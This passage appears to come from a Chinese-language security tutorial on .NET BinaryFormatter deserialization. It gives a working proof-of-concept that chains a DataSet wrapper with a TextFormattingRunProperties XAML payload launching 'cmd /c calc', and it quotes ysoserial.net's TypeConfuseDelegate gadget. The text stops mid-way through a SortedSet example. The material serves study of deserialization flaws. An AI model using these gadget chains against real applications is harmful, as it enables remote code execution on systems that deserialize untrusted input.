<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">private void DeserializeDataSetSchema(</span><br><span class="line">      SerializationInfo info,</span><br><span class="line">      StreamingContext context,</span><br><span class="line">      SerializationFormat remotingFormat,</span><br><span class="line">      SchemaSerializationMode schemaSerializationMode)</span><br><span class="line">    &#123;</span><br><span class="line">      if (remotingFormat != SerializationFormat.Xml)</span><br><span class="line">      &#123;</span><br><span class="line">        if (schemaSerializationMode == SchemaSerializationMode.IncludeSchema)</span><br><span class="line">        &#123;</span><br><span class="line">          this.DeserializeDataSetProperties(info, context);</span><br><span class="line">          int int32 = info.GetInt32(&quot;DataSet.Tables.Count&quot;);</span><br><span class="line">          for (int index = 0; index &lt; int32; ++index)</span><br><span class="line">          &#123;</span><br><span class="line">            MemoryStream serializationStream = new MemoryStream((byte[]) info.GetValue(string.Format((IFormatProvider) CultureInfo.InvariantCulture, &quot;DataSet.Tables_&#123;0&#125;&quot;, new object[1]</span><br><span class="line">            &#123;</span><br><span class="line">              (object) index</span><br><span class="line">            &#125;), typeof (byte[])));</span><br><span class="line">            serializationStream.Position = 0L;</span><br><span class="line">            this.Tables.Add((DataTable) new BinaryFormatter((ISurrogateSelector) null, new StreamingContext(context.State, (object) false)).Deserialize((Stream) serializationStream));</span><br><span class="line">          &#125;</span><br><span class="line">          for (int index = 0; index &lt; int32; ++index)</span><br><span class="line">            this.Tables[index].DeserializeConstraints(info, context, index, true);</span><br><span class="line">          this.DeserializeRelations(info, context);</span><br><span class="line">          for (int index = 0; index &lt; int32; ++index)</span><br><span class="line">            this.Tables[index].DeserializeExpressionColumns(info, context, index);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">          this.DeserializeDataSetProperties(info, context);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        string s = (string) info.GetValue(&quot;XmlSchema&quot;, typeof (string));</span><br><span class="line">        if (s == null)</span><br><span class="line">          return;</span><br><span class="line">        this.ReadXmlSchema((XmlReader) new XmlTextReader((TextReader) new StringReader(s)), true);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.Tables.Add((DataTable) new BinaryFormatter((ISurrogateSelector) null, new StreamingContext(context.State, (object) false)).Deserialize((Stream) serializationStream));</span><br></pre></td></tr></table></figure>
<p>主要是这行代码进行了Binary二进制反序列化</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225183528131.png" alt="image-20240225183528131"></p>
<p>然后我们就只关注这个serializationStream参数是在哪传入的就行了   我们将第一次的序列化流给其赋值就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MemoryStream serializationStream = new MemoryStream((byte[]) info.GetValue(string.Format((IFormatProvider) CultureInfo.InvariantCulture, &quot;DataSet.Tables_&#123;0&#125;&quot;, new object[1]</span><br></pre></td></tr></table></figure>
<p>它来自<code>DataSet.Tables_0</code>的值，那我们在序列化的时候给他赋值为TextFormattingRunProperties的二进制bytes流即可，但是我们也需要给其他属性赋值，否则无法正常反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">info.SetType(typeof(System.Data.DataSet));</span><br><span class="line">            info.AddValue(&quot;DataSet.RemotingFormat&quot;, System.Data.SerializationFormat.Binary);</span><br><span class="line">            info.AddValue(&quot;DataSet.DataSetName&quot;, &quot;&quot;);</span><br><span class="line">            info.AddValue(&quot;DataSet.Namespace&quot;, &quot;&quot;);</span><br><span class="line">            info.AddValue(&quot;DataSet.Prefix&quot;, &quot;&quot;);</span><br><span class="line">            info.AddValue(&quot;DataSet.CaseSensitive&quot;, false);</span><br><span class="line">            info.AddValue(&quot;DataSet.LocaleLCID&quot;, 0x409);</span><br><span class="line">            info.AddValue(&quot;DataSet.EnforceConstraints&quot;, false);</span><br><span class="line">            info.AddValue(&quot;DataSet.ExtendedProperties&quot;, (System.Data.PropertyCollection)null);</span><br><span class="line">            info.AddValue(&quot;DataSet.Tables.Count&quot;, 1);</span><br><span class="line">            info.AddValue(&quot;DataSet.Tables_0&quot;, _fakeTable);</span><br></pre></td></tr></table></figure>
<p>这些值是再yoserial中查看到的   就是得给这些值赋值才行    不然会反序列化失败</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225183842031.png" alt="image-20240225183842031"></p>
<p>poc</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DonNET_Deserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> xaml</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = xaml;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingPropersGadgets</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingPropersGadgets</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">GetTextFormattingPropersBytes</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xaml_payload =</span><br><span class="line">                <span class="string">&quot;&lt;ResourceDictionary \n                    xmlns=\&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation\&quot; \n                    xmlns:d=\&quot;http://schemas.microsoft.com/winfx/2006/xaml\&quot; \n                    xmlns:b=\&quot;clr-namespace:System;assembly=mscorlib\&quot; \n                    xmlns:c=\&quot;clr-namespace:System.Diagnostics;assembly=system\&quot;&gt;\n    &lt;ObjectDataProvider d:Key=\&quot;\&quot; ObjectType=\&quot;&#123;d:Type c:Process&#125;\&quot; MethodName=\&quot;Start\&quot;&gt;\n        &lt;ObjectDataProvider.MethodParameters&gt;\n            &lt;b:String&gt;cmd&lt;/b:String&gt;\n            &lt;b:String&gt;/c calc&lt;/b:String&gt;\n        &lt;/ObjectDataProvider.MethodParameters&gt;\n    &lt;/ObjectDataProvider&gt;\n&lt;/ResourceDictionary&gt;&quot;</span>;</span><br><span class="line">            TextFormattingRunPropertiesMarshal payload = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(xaml_payload);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, payload);</span><br><span class="line">                <span class="keyword">return</span> memoryStream.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DataSetMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] _fakeTable;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Data.DataSet));</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.RemotingFormat&quot;</span>, System.Data.SerializationFormat.Binary);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.DataSetName&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Namespace&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Prefix&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.CaseSensitive&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.LocaleLCID&quot;</span>, <span class="number">0x409</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.EnforceConstraints&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.ExtendedProperties&quot;</span>, (System.Data.PropertyCollection)<span class="literal">null</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables.Count&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables_0&quot;</span>, _fakeTable);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetFakeTable</span>(<span class="params"><span class="built_in">byte</span>[] bfPayload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _fakeTable = bfPayload;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DatasetGadgets</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> textFormattingPropersBytes = TextFormattingPropersGadgets.GetTextFormattingPropersBytes();</span><br><span class="line">            <span class="keyword">var</span> dataSetMarshal = <span class="keyword">new</span> DataSetMarshal();</span><br><span class="line">            dataSetMarshal.SetFakeTable(textFormattingPropersBytes);</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, dataSetMarshal);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用栈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">new TextFormattingRunProperties() </span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject() [2]</span><br><span class="line">ObjectManager.FixupSpecialObject() [2]</span><br><span class="line">ObjectManager.DoFixups() [2]</span><br><span class="line">ObjectReader.Deserialize() [2]</span><br><span class="line">BinaryFormatter.Deserialize() [2]</span><br><span class="line">DataSet.DeserializeDataSetSchema() </span><br><span class="line">new DataSet()</span><br><span class="line">new DataSet()</span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject() [1]</span><br><span class="line">ObjectManager.FixupSpecialObject() [1]</span><br><span class="line">ObjectManager.DoFixups() [1]</span><br><span class="line">ObjectReader.Deserialize() </span><br><span class="line">BinaryFormatter.Deserialize() </span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">DatasetGadgets.Main()</span><br></pre></td></tr></table></figure>
<h2 id="TypeConfuseDelegate"><a href="#TypeConfuseDelegate" class="headerlink" title="TypeConfuseDelegate"></a>TypeConfuseDelegate</h2><p>TypeConfuseDelegate中文翻译过来叫类型混淆委托。那么学习这条链之前必须要了解什么是委托。 其并不是一个类</p>
<h3 id="委托"><a href="#委托" class="headerlink" title="委托"></a>委托</h3><p>其实是跟java的动态代理是差不多意思的</p>
<p>给个委派的demo</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">MyDelegate</span>(<span class="params"><span class="built_in">string</span> s</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">PrintString</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyDelegate myDelegate = <span class="keyword">new</span> MyDelegate(PrintString);</span><br><span class="line">        myDelegate(<span class="string">&quot;hello from delegate&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226094829689.png" alt="image-20240226094829689"></p>
<p><strong>需要注意的是传递给委托的方法签名必须和定义的委托签名一致，即返回值、参数一致(参数类型和数量一致)。</strong></p>
<p>通过new MyDelegate(PrintString)将PrintString的引用赋值给myDelegate，然后使用myDelegate(“hello from delegate”)传递参数。myDelegate持有对PrintString的引用。</p>
<h3 id="多播委托"><a href="#多播委托" class="headerlink" title="多播委托"></a>多播委托</h3><p>多播委托则是持有对委托列表的引用，<strong>把多播委托想象成一个列表</strong>，将委托的方法加入列表中，多播委托会按顺序依次调用每个委托。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line">namespace DonNET_Deserialization;</span><br><span class="line"></span><br><span class="line">class Program</span><br><span class="line">&#123;</span><br><span class="line">    public delegate void MyDelegate(string s);</span><br><span class="line"></span><br><span class="line">    public static void PrintString(string s)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine($&quot;print &#123;s&#125; to screen.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void WriteToFile(string s)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine($&quot;write &#123;s&#125; to file.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        MyDelegate myDelegate = new MyDelegate(PrintString);</span><br><span class="line">        MyDelegate myDelegate1 = new MyDelegate(WriteToFile);</span><br><span class="line">        myDelegate += myDelegate1;</span><br><span class="line">        myDelegate(&quot;hello&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226095215225.png" alt="image-20240226095215225"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226095231589.png" alt="image-20240226095231589"></p>
<p>其实重点就在于这   是可以进行相加的   把其想象成一个列表  调用的时候会从中依次进行调用</p>
<p><strong>还可以用MulticastDelegate.Combine(printString, writeFile)的形式。(主要是使用这种方法)</strong></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DonNET_Deserialization</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">MyDelegate</span>(<span class="params"><span class="built_in">string</span> s</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">PrintString</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;print <span class="subst">&#123;s&#125;</span> to screen.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WriteToFile</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;write <span class="subst">&#123;s&#125;</span> to file.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyDelegate printString = <span class="keyword">new</span> MyDelegate(PrintString);</span><br><span class="line">        MyDelegate writeFile = <span class="keyword">new</span> MyDelegate(WriteToFile);</span><br><span class="line">        Delegate twoDelegte = MulticastDelegate.Combine(printString, writeFile);</span><br><span class="line">        twoDelegte.DynamicInvoke(<span class="string">&quot;something&quot;</span>);  <span class="comment">//调用函数</span></span><br><span class="line">        Delegate[] delegates = twoDelegte.GetInvocationList();   <span class="comment">//查看存入列表中的函数</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> item <span class="keyword">in</span> delegates)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(item.Method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226095516526.png" alt="image-20240226095516526"></p>
<h3 id="SortedSet和Comparer"><a href="#SortedSet和Comparer" class="headerlink" title="SortedSet和Comparer"></a>SortedSet和Comparer</h3><p>ysoserial.net中链子的样子</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">object</span> <span class="title">GetXamlGadget</span>(<span class="params"><span class="built_in">string</span> xaml_payload</span>)</span></span><br><span class="line">       &#123;</span><br><span class="line">           Delegate da = <span class="keyword">new</span> Comparison&lt;<span class="built_in">string</span>&gt;(String.Compare);</span><br><span class="line">           Comparison&lt;<span class="built_in">string</span>&gt; d = (Comparison&lt;<span class="built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);</span><br><span class="line">           IComparer&lt;<span class="built_in">string</span>&gt; comp = Comparer&lt;<span class="built_in">string</span>&gt;.Create(d);</span><br><span class="line">           SortedSet&lt;<span class="built_in">string</span>&gt; <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(comp);</span><br><span class="line">           <span class="keyword">set</span>.Add(xaml_payload);</span><br><span class="line">           <span class="keyword">set</span>.Add(<span class="string">&quot;&quot;</span>);</span><br><span class="line">           FieldInfo fi = <span class="keyword">typeof</span>(MulticastDelegate).GetField(<span class="string">&quot;_invocationList&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">           <span class="built_in">object</span>[] invoke_list = d.GetInvocationList();</span><br><span class="line">           <span class="comment">// We use XamlReader.Parse() to trigger the xaml execution</span></span><br><span class="line">           invoke_list[<span class="number">1</span>] = <span class="keyword">new</span> Func&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;(System.Windows.Markup.XamlReader.Parse);</span><br><span class="line">           fi.SetValue(d, invoke_list);</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">set</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>其实看起来和我们上面用到的不太一样  </p>
<p>这里是通过<code>SortedSet&lt;T&gt;</code>和<code>Comparer</code>进行利用的   接下来介绍一下这两个类</p>
<p>给一个简单的demo</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BinaryFormatterSerialize</span></span><br><span 